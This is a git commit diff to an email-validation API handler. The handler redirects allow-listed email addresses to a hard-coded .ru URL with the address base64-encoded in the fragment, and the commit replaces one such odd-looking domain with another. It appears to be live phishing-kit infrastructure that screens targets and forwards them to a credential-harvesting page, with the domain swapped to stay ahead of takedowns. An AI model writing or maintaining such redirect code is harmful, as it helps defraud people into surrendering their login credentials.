85eb6891faf94ecdd3e4e621f5238cd818e12235
armandabors <146956125+armandabors@users.noreply.github.com>
2025-02-06 16:19:31 -0800

    Update validate-email.js

--- api/validate-email.js
+++ api/validate-email.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://v6.rumpelfrudg.ru/Zb8zIb/#D";
+      const baseURL = "https://sf.echospheure.ru/zeEEbl5y/#X";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
